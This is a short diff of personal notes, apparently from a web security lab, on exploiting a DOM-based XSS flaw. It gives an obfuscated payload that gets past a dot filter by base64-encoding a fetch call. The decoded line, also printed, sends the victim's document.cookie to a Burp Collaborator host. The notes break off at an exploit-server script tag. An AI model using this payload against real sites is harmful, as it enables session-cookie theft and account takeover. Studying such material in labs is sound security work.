@@ -1,12 +1,12 @@
 Active Scan => DOM-XSS => "-alert(1)-"
 
+dots are blocked => first bypass to get cookie => alert([document][cookie]) cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.
+
 Exploit:
 "-eval(atob('ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ=='))-"
 
 base64 part:
 fetch('https://6ho7tvv3cg9zw205wwtrac5wrnxel49t.oastify.com?cookie='+document.cookie)
-
-
 
 Exploit server:
 <script>
